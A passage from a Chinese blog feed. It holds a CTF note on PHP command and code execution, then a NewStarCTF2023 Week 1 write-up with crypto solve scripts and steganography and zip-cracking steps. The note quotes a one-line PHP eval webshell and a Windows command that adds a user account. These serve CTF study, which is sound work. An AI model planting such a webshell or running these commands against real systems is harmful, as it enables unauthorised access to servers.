        <content type="html"><![CDATA[<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果目标站点在设计时期<strong>过滤功能不严格</strong>或<strong>数据与代码区分不明显</strong>，极易导致命令执行漏洞的存在。</p><p>总结下来，原理就是：1. 用户输入未过滤或净化的参数。2. 输入被拼接到系统命令中执行。</p><h3 id="常见系统命令执行函数"><a href="#常见系统命令执行函数" class="headerlink" title="常见系统命令执行函数"></a>常见系统命令执行函数</h3><p>system() 执行命令输出结果</p><p>exec() 执行命令，并返回结果的最后一行</p><p>shell_exec() 执行命令，并返回所有结果</p><p>passthru() 执行命令输出结果</p><p>``(反引号) 功能和shell_exec() 相同，如果shell_exec() 被禁用，则反引号也无法使用，但如果只是被过滤，则可以用反引号代替shell_exec()</p><p>$a = popen(要执行的命令，参数) 参数可以是’r’和’w’，为r时返回值为包含执行结果的文件指针</p><p>使用fread($a,1024)可以输出返回值</p><h3 id="常见系统命令"><a href="#常见系统命令" class="headerlink" title="常见系统命令"></a>常见系统命令</h3><h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号"></a>管道符号</h3><p><strong>Linux常用管道符</strong></p><p><code>;</code> 前面的执行完执行后面的，排队<br><code>|</code> 前面命令的打印结果作为后面命令的输入<br><code>||</code>当前面的执行出错时，执行后面的<br><code>&amp;</code>相当于or，前面无论真假都会执行后面的<br><code>&amp;&amp;</code> 相当于and，前假后不执行，前真后执行</p><p><strong>Windows常用管道符</strong></p><p>“|”、“||”、“&amp;”、“&amp;&amp;”和Linux同理</p><h3 id="windows-常见命令"><a href="#windows-常见命令" class="headerlink" title="windows 常见命令"></a>windows 常见命令</h3><p>netstat -ano 查看端口<br>tasklist 查看进程<br>ipconfig 查看ip<br>kill 杀死进程的<br>arp -a 探测路由表<br>whoami 查看当前权限<br>shutdown 关机 （关闭杀软服务，然后重启主机）<br>systeminfo 查看系统状态<br>net user 查看用户<br>net user a abc123 /add 添加用户</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>以Web木马中的一句话木马为例，在常见的PHP小马  <code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code>中，就以 eval 的方式将 POST 传过来的参数，以PHP的方式加以执行。其中 X 参数由外部传入，也就是成为攻击者可以控制的参数，从而形成远程命令执行的漏洞。</p><p>eval() 执行命令</p><p>assert() 执行命令并判断结果是否有效</p><div class="note info flat"><p>eval()与assert()函数的区别：</p><ol><li><p>eval()与assert()函数在执行效果上基本相同，均可动态执行代码，且接收的参数为字符串。 assert()函数虽然也会执行参数内的代码，但主要用来判断一个表达式是否成立，并返回 True 或 false 。实战中，eval()函数通常会被系统禁用，因此在一句话木马中通常利用 assert() 来实现 代码执行。</p></li><li><p>eval 参数必须是合法的PHP代码，必须以分号结尾，否则会报错。</p><p>而 assert() 函数则不存在此问题，也就是他针对PHP语法规范要求并不明 显。</p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023 Week1题解</title>
      <link href="/posts/0b13dfcee0a2/"/>
      <url>/posts/0b13dfcee0a2/</url>
      
        <content type="html"><![CDATA[<p> NewStarCTF2023，或者应该叫OldBirdCTF🤣本文为第一周所有题目的题解，可能与官方wp有出入，请见谅。</p><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925095953171.png" alt="image-20230925095953171"></p><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925100147774.png" alt="image-20230925100147774"></p><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925100254640.png" alt="image-20230925100254640"></p><h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>低解密指数问题，使用sage脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line">c = <span class="number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line">e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925100507632.png" alt="image-20230925100507632"></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>使用yafu分解大整数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925101103990.png" alt="image-20230925101103990"></p><p>分析本题为多幂因子n</p><p>本题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">P1 = <span class="number">3207148519</span></span><br><span class="line">P2 = <span class="number">4278428893</span></span><br><span class="line">P3 = <span class="number">4093178561</span></span><br><span class="line">P4 = <span class="number">2970591037</span></span><br><span class="line">P5 = <span class="number">2370292207</span></span><br><span class="line">P6 = <span class="number">2706073949</span></span><br><span class="line">P7 = <span class="number">2338725373</span></span><br><span class="line">P8 = <span class="number">3654864131</span></span><br><span class="line">P9 = <span class="number">3939901243</span></span><br><span class="line">P10 = <span class="number">2463878387</span></span><br><span class="line">P11 = <span class="number">2923072267</span></span><br><span class="line">P12 = <span class="number">2804303069</span></span><br><span class="line">P13 = <span class="number">3831680819</span></span><br><span class="line">P14 = <span class="number">2217990919</span></span><br><span class="line">P15 = <span class="number">2794985117</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line">phi_n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    value = <span class="built_in">eval</span>(<span class="string">&#x27;P&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    phi_n *= value-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(phi_n)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925102141088.png" alt="image-20230925102141088"></p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><p>先把flag标志爆出来</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925103019305.png" alt="image-20230925103019305"></p><p>考虑括号内的语义</p><p>5ign0r较为有语义，考虑密钥为6位，那么猜个<code>kfckfc</code></p><p>得到flag，感觉是法语</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925103900653.png" alt="image-20230925103900653"></p><h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>使用python脚本爆破key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line">ciphertext=<span class="string">b&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)//<span class="number">2</span>):</span><br><span class="line">        c = <span class="built_in">int</span>(ciphertext[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],base=<span class="number">16</span>)</span><br><span class="line">        flag+=(<span class="built_in">chr</span>(c^key))</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925144531922.png" alt="image-20230925144531922"></p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>仿射变化，只是两个参数都没给，直接爆破</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">ciphertext=<span class="string">&#x27;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,key0,key1</span>):</span><br><span class="line">    c=<span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+c)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>((c+<span class="number">256</span>*i-key1)%key0==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> (c+<span class="number">256</span>*i-key1)//key0</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        length=<span class="built_in">len</span>(ciphertext)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            f = decrypt(ciphertext[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],key0,key1)</span><br><span class="line">            <span class="keyword">if</span>(f&lt;<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(f)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925144405575.png" alt="image-20230925144405575"></p><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>题目如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure><p>前两部分分别为base64和base32</p><p>解出得到前两部分分别为<code>flag&#123;dazzling_encoding#4e0ad4</code>和<code>f0ca08d1e1d0f10c0c7afe422fea7</code></p><p>第三部分由于只出现大写字母，猜测为<strong>uuencode</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925150033931.png" alt="image-20230925150033931"></p><p>得到第三部分</p><p>所以最终flag为<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>分析源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>由于key由2个重复的16位组成，与iv异或时，高位不会发生变化</p><p>所有可以直接通过key的高位复原key，进而得到iv</p><p>exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc_flag=<span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">ivorkey=long_to_bytes(<span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>)</span><br><span class="line">key_high=ivorkey[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">key=key_high*<span class="number">2</span></span><br><span class="line">iv=long_to_bytes(bytes_to_long(key_high)^bytes_to_long(ivorkey[<span class="number">16</span>:]))</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925152617899.png" alt="image-20230925152617899"></p><p>括上flag{}，即<code>flag&#123;firsT_cry_Aes&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>如题，使用CyberChef的自动识别</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925112321042.png" alt="image-20230925112321042"></p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925112336817.png" alt="image-20230925112336817"></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>扫码发现没有flag</p><p>使用<strong>stegsolve</strong>分析</p><p>在Red0、Green0和Blue0中看到额外信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925113205146.png" alt="image-20230925113205146"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925185716710.png" alt="image-20230925185716710"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925185728527.png" alt="image-20230925185728527"></p><p>考虑RGB隐写</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925185825658.png" alt="image-20230925185825658"></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>这题考到White<em>space语言，具体参考这篇文章[由空格等不可见字符组成的隐写</em>文件隐写空格回车_M3ng@L的博客-CSDN博客](<a href="https://blog.csdn.net/qq_51999772/article/details/122418926">https://blog.csdn.net/qq_51999772/article/details/122418926</a>)</p><p>到在线解码网站<a href="https://vii5ard.github.io/whitespace/">Whitelips the Whitespace IDE (vii5ard.github.io)</a></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925192153618.png" alt="image-20230925192153618"></p><p>flag为<code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>查找flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925192453423.png" alt="image-20230925192453423"></p><p>找到状态码为200的响应报文，发现base64码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925224945277.png" alt="image-20230925224945277"></p><p>使用cyberchef自动解码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925225154015.png" alt="image-20230925225154015"></p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>题目翻译成英文即<strong>SilentEye</strong>，经典的图片隐写工具</p><p>把图片丢进去解密即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926002512439.png" alt="image-20230926002512439"></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>用010editor打开，看到关键词PK，发现其中有flag.zip压缩包</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925201225379.png" alt="image-20230925201225379"></p><p>发现一段base64（出题人怎么这么喜欢base64）</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925225420878.png" alt="image-20230925225420878"></p><p>解码得到<code>I like six-digit numbers because they are very concise and easy to remember.</code></p><p>说明密码为6位数</p><p>使用爆破工具<strong>AZPR</strong>，设为全数字、六位数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925225759492.png" alt="image-20230925225759492"></p><p>得到密码<strong>232311</strong></p><p>解压flag.zip，得到flag.txt</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925230417811.png" alt="image-20230925230417811"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>只传一个参数，页面报错</p><p>查看错误信息，泄露的源码中有flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925123930572.png" alt="image-20230925123930572"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>访问站点</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925124551298.png" alt="image-20230925124551298"></p><p>传参R1ck</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925124621556.png" 